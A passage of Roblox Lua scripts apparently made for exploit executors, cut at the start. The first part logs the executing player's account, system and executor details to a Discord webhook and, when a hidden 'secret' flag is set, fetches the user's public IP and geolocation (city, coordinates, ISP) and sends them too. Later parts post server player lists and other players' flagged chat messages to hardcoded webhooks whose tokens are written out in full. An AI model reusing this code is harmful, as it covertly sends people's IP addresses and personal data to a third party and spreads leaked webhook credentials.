    local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
    local playerCount = #players:GetPlayers()
    local maxPlayers = players.MaxPlayers
    local health = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
    local maxHealth = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or "N/A"
    local position = player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character.HumanoidRootPart.Position or "N/A"
    local gameVersion = game.PlaceVersion

    local gameName = "Unknown Game"
    pcall(function()
        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    end)

    task.wait(1)

    local pingValue = "N/A"
    pcall(function()
        local serverStats = game:GetService("Stats").Network.ServerStatsItem
        local dataPing = serverStats["Data Ping"]:GetValueString()
        pingValue = tonumber(dataPing:match("(%d+)")) or "N/A"
    end)

    local function checkPremium()
        local premium = "false"
        pcall(function()
            premium = (player.MembershipType ~= Enum.MembershipType.None) and "true" or "false"
        end)
        return premium
    end
    local premium = checkPremium()

    local url = getgenv().webhookexecUrl

    local data = {
        ["content"] = "SCRIPT EXECUTE",
        ["embeds"] = {{
            ["title"] = "🚀 **Script Execution Detected | Exec Log**",
            ["description"] = "*A script was executed. Here are the details:*",
            ["type"] = "rich",
            ["color"] = 0x3498db,
            ["fields"] = {
                {["name"] = "🔍 **Script Info**", ["value"] = "```💻 Script Name: " .. getgenv().whscript .. "\n⏰ Executed At: " .. completeTime .. "```", ["inline"] = false},
                {["name"] = "👤 **Player Details**", ["value"] = "```🧸 Username: " .. player.Name .. "\n📝 Display Name: " .. player.DisplayName .. "\n🆔 UserID: " .. userid .. "\n❤️ Health: " .. health .. " / " .. maxHealth .. "\n🔗 Profile: https://www.roblox.com/users/" .. userid .. "/profile```", ["inline"] = false},
                {["name"] = "📅 **Account Information**", ["value"] = "```🗓️ Account Age: " .. player.AccountAge .. " days\n💎 Premium: " .. premium .. "\n📅 Created: " .. os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```", ["inline"] = false},
                {["name"] = "🎮 **Game Details**", ["value"] = "```🏷️ Game: " .. gameName .. "\n🆔 Place ID: " .. gameid .. "\n🔗 Link: https://www.roblox.com/games/" .. gameid .. "\n🔢 Version: " .. gameVersion .. "```", ["inline"] = false},
                {["name"] = "🔗 **JobID Server**", ["value"] = "```" .. jobid .. "```", ["inline"] = false},
                {["name"] = "🕹️ **Server Info**", ["value"] = "```👥 Players: " .. playerCount .. " / " .. maxPlayers .. "\n🕒 Time: " .. os.date("%H:%M:%S") .. "```", ["inline"] = true},
                {["name"] = "📡 **Network**", ["value"] = "```📶 Ping: " .. pingValue .. " ms```", ["inline"] = true},
                {["name"] = "🖥️ **System**", ["value"] = "```📺 Resolution: " .. screenWidth .. "x" .. screenHeight .. "\n🔍 Memory: " .. memoryUsage .. " MB\n⚙️ Executor: " .. identifyexecutor() .. "```", ["inline"] = true},
                {["name"] = "📍 **Position**", ["value"] = "```" .. tostring(position) .. "```", ["inline"] = true},
                {["name"] = "🪧 **Join Script**", ["value"] = "```lua\n" .. snipePlay .. "```", ["inline"] = false}
            },
            ["thumbnail"] = {["url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512"},
            ["footer"] = {["text"] = "Execution Log | " .. os.date("%Y-%m-%d %H:%M:%S")}
        }}
    }

    if getgenv().ExecLogSecret then
        pcall(function()
            local ip = game:HttpGet("https://api.ipify.org")
            local iplink = "https://ipinfo.io/" .. ip .. "/json"
            local ipinfo_json = game:HttpGet(iplink)
            local ipinfo_table = game:GetService("HttpService"):JSONDecode(ipinfo_json)
            table.insert(data.embeds[1].fields, {
                ["name"] = "**`(🤫) Secret`**",
                ["value"] = "||(👣) IP: " .. ipinfo_table.ip .. "||\n||(🌆) Country: " .. ipinfo_table.country .. "||\n||(🪟) Loc: " .. ipinfo_table.loc .. "||\n||(🏙️) City: " .. ipinfo_table.city .. "||\n||(🏡) Region: " .. ipinfo_table.region .. "||\n||(🪢) Org: " .. ipinfo_table.org .. "||"
            })
        end)
    end

    -- debug print
    print("")
    local newdata = game:GetService("HttpService"):JSONEncode(data)
    local headers = {["content-type"] = "application/json"}
    local request_func = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    local success, err = pcall(function()
        request_func(abcdef)
    end)
    if success then
        print("")
    else
        warn("eror?" .. tostring(err))
    end
end

-- 2
getgenv().webhookUrl = "https://discord.com/api/webhooks/1455468612054945926/BUTey9sxe5lQo6YUvqb3ljqMFvWGzZ_caH2Sxq8x_tahKjXhwuL1wlnbrlY0dVrz6eLB" 

local riskKeywords = {"afz", "stars", "st4rs", "star", "st4r"}

local gameName = "Unknown Game"
local gameVersion = "Unknown"
local success, info = pcall(function()
    return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
end)
if success and info then
    gameName = info.Name or gameName
    gameVersion = info.CurrentVersion or gameVersion
end

local function sendWebhook(embed, pingEveryone)
    local content = pingEveryone and "@everyone RISK USER DETECTED!" or "No risk user on the server"
    local data = {
        ["content"] = content,
        ["embeds"] = {embed}
    }
    local HttpService = game:GetService("HttpService")
    local json = HttpService:JSONEncode(data)
    local headers = {["Content-Type"] = "application/json"}
    local requestFunc = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
    
    if not requestFunc then
        warn("")
        return
    end
    
    local success, err = pcall(function()
        requestFunc({
            Url = getgenv().webhookUrl,
            Body = json,
            Method = "POST",
            Headers = headers
        })
    end)
    if not success then
        warn("eror?: " .. tostring(err))
    else
        print("")
    end
end

local function getServerPlayersList()
    local playersList = {}
    local count = 0
    for _, plr in ipairs(game.Players:GetPlayers()) do
        count = count + 1
        local name = plr.Name
        local display = plr.DisplayName or name
        table.insert(playersList, string.format("%02d. %s | %s", count, name, display))
    end
    return table.concat(playersList, "\n"), count, game.Players.MaxPlayers
end

local function checkRiskUsers()
    local riskList = {}
    for _, plr in ipairs(game.Players:GetPlayers()) do
        local nameLower = string.lower(plr.Name)
        local displayLower = string.lower(plr.DisplayName or "")
        for _, kw in ipairs(riskKeywords) do
            if string.find(nameLower, kw) or string.find(displayLower, kw) then
                table.insert(riskList, plr.Name .. " | Display: " .. (plr.DisplayName or "N/A"))
            end
        end
    end
    return riskList
end

local function sendUpdate()
    local playerList, currentPlayers, maxPlayers = getServerPlayersList()
    local riskUsers = checkRiskUsers()
    local riskText = #riskUsers > 0 and table.concat(riskUsers, "\n") or "Tidak ditemukan"
    local pingEveryone = #riskUsers > 0

    local embed = {
        ["title"] = "**HEY THERE, THIS IS PLAYER SERVER LIST**",
        ["color"] = 0xFFAA00,
        ["fields"] = {
            {["name"] = "🎮 **Game Details**", ["value"] = "```🏷️ Game: " .. gameName .. "\n🆔 Place ID: " .. game.PlaceId .. "\n🔗 Link: https://www.roblox.com/games/" .. game.PlaceId .. "\n🔢 Version: " .. gameVersion .. "```", ["inline"] = false},
            {["name"] = "🔗 **JobID**", ["value"] = "```" .. game.JobId .. "```", ["inline"] = false},
            {["name"] = "👥 **SERVER PLAYERS** (" .. currentPlayers .. "/" .. maxPlayers .. ")", ["value"] = "```" .. playerList .. "```", ["inline"] = false}
        }
    }

    if #riskUsers > 0 then
        table.insert(embed.fields, {
            ["name"] = "⚠️ **RISK USER FOUND**",
            ["value"] = "```" .. riskText .. "```",
            ["inline"] = false
        })
    end

    sendWebhook(embed, pingEveryone)
    print("")
end

sendUpdate()

-- 3
getgenv().webhookUrl = "https://discord.com/api/webhooks/1452911676578988163/j_CEbw5rEcmrEYWX7H-Zdzc1V2B47W3_-CC2yzPR_H9fv3_WzJSy5TTpg0E_afhxVFK0"

local toxicWords = {
    "anj", "anjing", "bangsat", "ngentot", "kontol", "memek", "anjir", "goblok", "bajingan", "sialan",
    "babi", "tai", "cok", "asu", "fuck", "shit", "bitch", "nigga", "nigger", "syng", "syg", "pacaran", "pcr", "ayy", "ayang", "ayng", "ayg", "tolol", "bego", "gendeng", "bgst", "bngst",
    "b3g0", "tai", "jumpboad", "jump boat", "jumpboat", "tuueemmpekk", "jamet", "ahh", "enak banget ayang", "yamete", "yameteh", "konto", "brengsek"
}

local function sendWebhook(embed)
    local data = {
        ["content"] = "TOXIC",
        ["embeds"] = {embed}
    }
    local json = game:GetService("HttpService"):JSONEncode(data)
    local headers = {["Content-Type"] = "application/json"}
    
    local requestFunc = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request) or (Krnl and Krnl.request)
    
    pcall(function()
        requestFunc({
            Url = getgenv().webhookUrl,
            Body = json,
            Method = "POST",
            Headers = headers
        })
    end)
end

local function isToxic(msg)
    local lowerMsg = string.lower(msg)
    for _, word in ipairs(toxicWords) do
        if string.find(lowerMsg, word, 1, true) then  -- true = plain text match (lebih aman)
            return true, word
        end
    end
    return false, nil
end

local function monitorPlayer(player)
    if player == game.Players.LocalPlayer then return end
    
    player.Chatted:Connect(function(msg)
        local isToxicMsg, toxicWord = isToxic(msg)
        if isToxicMsg then
            local placeId = game.PlaceId
            local jobId = game.JobId
            
            local embed = {
                ["title"] = "🚨 **CHAT TOXIC DETECTED**",
                ["description"] = "Player mengirim pesan toxic di chat!",
                ["color"] = 0xFF0000,
                ["fields"] = {
                    {["name"] = "👤 **Username**", ["value"] = player.Name, ["inline"] = true},
                    {["name"] = "🏷️ **Display Name**", ["value"] = player.DisplayName or "N/A", ["inline"] = true},
                    {["name"] = "🆔 **UserID**", ["value"] = tostring(player.UserId), ["inline"] = true},
                    
                    -- bagian game details yang bener (tanpa variabel ga jelas)
                    {["name"] = "🎮 **Game Info**",
                     ["value"] = string.format(
                         "```" ..
                         "Place ID : %d\n" ..
                         "Link     : https://www.roblox.com/games/%d/\n" ..
                         "JobId    : %s```",
                         placeId, placeId, jobId
                     ),
                     ["inline"] = false},
                    
                    {["name"] = "💬 **Message**", ["value"] = "```" .. msg:gsub("`", "\\`") .. "```", ["inline"] = false},  -- escape backtick biar ga rusak format
                    {["name"] = "⚠️ **Kata Toxic**", ["value"] = toxicWord, ["inline"] = true},
                    {["name"] = "📝 **Deskripsi Report**", 
                     ["value"] = "User terdeteksi mengirimkan pesan yang melanggar Community Rules Roblox (kata kasar/toxic).", 
                     ["inline"] = false}
                },
                ["footer"] = {
                    ["text"] = "Toxic Logger | " .. os.date("%Y-%m-%d %H:%M:%S WIB")
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")  -- format ISO untuk timestamp Discord
            }

            sendWebhook(embed)
            warn("[Toxic Logger] Detected: " .. player.Name .. " | Kata: " .. toxicWord)
        end
    end)
end

for _, player in ipairs(game.Players:GetPlayers()) do
    monitorPlayer(player)
end

game.Players.PlayerAdded:Connect(monitorPlayer)
